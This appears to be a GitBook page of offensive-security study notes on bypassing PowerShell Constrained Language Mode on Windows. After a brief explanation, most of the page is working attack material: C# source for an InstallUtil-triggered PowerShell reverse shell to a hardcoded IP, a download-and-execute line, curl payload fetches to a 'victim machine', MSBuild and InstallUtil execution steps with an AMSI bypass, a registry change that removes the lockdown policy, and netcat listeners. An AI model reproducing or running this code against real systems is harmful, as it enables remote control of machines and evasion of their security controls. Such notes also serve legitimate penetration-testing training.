# CLM

<details>

<summary>What is it? + How to enable?</summary>

* Constrained Language Mode is a PowerShell security restriction enforced by Windows Defender Application Control (WDAC) or Device Guard.&#x20;
* It limits access to certain commands and features, reducing the risk of malicious script execution.

- Run the following command on admin powershell.exe:

```powershell
$ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"
```

</details>

<details>

<summary>Checking CLM</summary>

```powershell
$ExecutionContext.SessionState.LanguageMode
```

* `FullLanguage` → **No restrictions** (default for admin users).
* `RestrictedLanguage` → **Highly restricted**, only allows basic expressions.
* `ConstrainedLanguage` → **Blocks .NET, COM objects, and Reflection**, while allowing most built-in cmdlets.

</details>

<details>

<summary>[Unprivileged] Bypass Using InstallUtil (bypass_clm_rev_shell.exe)</summary>

```csharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Hello from main");
        }
    }
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            string rev = @"$client = New-Object System.Net.Sockets.TCPClient('192.168.45.198',53);
                                    $stream = $client.GetStream();
                                    [byte[]]$bytes = 0..65535|%{0};
                                    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
                                    {
	                                    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
	                                    try
	                                    {	
		                                    $sendback = (iex $data 2>&1 | Out-String );
		                                    $sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';
	                                    }
	                                    catch
	                                    {
		                                    $error[0].ToString() + $error[0].InvocationInfo.PositionMessage;
		                                    $sendback2  =  ""ERROR: "" + $error[0].ToString() + ""`n`n"" + ""PS "" + (pwd).Path + '> ';
	                                    }	
	                                    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
	                                    $stream.Write($sendbyte,0,$sendbyte.Length);
	                                    $stream.Flush();
                                    };
                                    $client.Close();";

            //String cmd = "IEX(New-Object Net.WebClient).DownloadString('http://192.168.45.198/runall.ps1') | powershell -noprofile";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(rev);
            ps.Invoke();
            rs.Close();
        }
    }
}

```



![](<../.gitbook/assets/image (2).png>)

In package manager console --> `NuGet\Install-Package Core.System.Configuration.Install -Version 1.1.0`

Also, need to add reference `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll`

Select Release & x64 version and build

### Exploitation

```bash
# Find full filepath of installutil: 
dir \Windows\Microsoft.NET\* /s/b | findstr InstallUtil.exe$
 
# Download CLM bypass reverse shell from Kali:
curl.exe http://192.168.45.198/bypass_clm_rev_shell.exe --output bypass_clm_rev_shell.exe

# Bypass clm with installutil:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U "bypass_clm_rev_shell.exe"

# Obtain reverse shell
nc -lvp 53
```

</details>

<details>

<summary>[Unprivileged] Bypass Using FullBypass</summary>

In FullBypass.csproj: edit line168 to use runall.ps1 --> AMSI bypass (1.txt & 2.txt) --> simple

![](<../.gitbook/assets/image (4).png>)

```
# Download to Victim machine
curl.exe http://192.168.45.198/FullBypass.csproj -o FullBypass.csproj

# Build the FullBypass C# project
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe .\FullBypass.csproj

# Obtain reverse shell
nc -lvp 53
```

</details>



```csharp
# Download to Victim machine
curl.exe http://192.168.45.198/FullBypass.csproj -o FullBypass.csproj

# Build the FullBypass C# project
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe .\FullBypass.csproj

# Obtain reverse shell
nc -lvp 53
```



<details>

<summary>[Privileged] CLM Bypass By Removal of the Associated Registry Key</summary>

```powershell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\" -name __PSLockdownPolicy -Value 8
```

</details>

<details>

<summary>[Unprivileged] CLM Bypass Using PSByPassCLM</summary>

* Emulate an interactive PowerShell console in a runspace unaffected by language mode
* Need to add reference
  * ```powershell
    C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll
    ```
  * ![](<../.gitbook/assets/image (10) (1).png>)

```csharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections.ObjectModel;
using System.Text;

namespace PowerShellConstrainedLanguageBypass {
    public class Program {
        public static void Main(string[] args) {
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();

            RunspaceInvoke runSpaceInvoker = new RunspaceInvoke(runspace);
            runSpaceInvoker.Invoke("Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope Process");

            string cmd = "";
            do {
                Console.Write("PS > ");
                cmd = Console.ReadLine();

                if (!string.IsNullOrEmpty(cmd)) {

                    using (Pipeline pipeline = runspace.CreatePipeline()) {

                        try {
                            pipeline.Commands.AddScript(cmd);
                            pipeline.Commands.Add("Out-String");

                            Collection<PSObject> results = pipeline.Invoke();
                            StringBuilder stringBuilder = new StringBuilder();

                            foreach (PSObject obj in results) {
                                stringBuilder.AppendLine(obj.ToString());
                            }

                            Console.Write(stringBuilder.ToString());
                        }

                        catch (Exception ex) {
                            Console.WriteLine("{0}", ex.Message);
                        }
                    }
                }
            } while (cmd != "exit");
        }
    }
}
```

</details>

<details>

<summary>Bypass CLM (Metasploit)</summary>

[https://github.com/beauknowstech/OSEP-Everything/tree/main/CLM%20bypass](https://github.com/beauknowstech/OSEP-Everything/tree/main/CLM%20bypass)

```bash
meterpreter > load powershell
meterpreter > powershell_execute $ExecutionContext.SessionState.LanguageMode
[+] Command execution completed:
FullLanguage
```

</details>

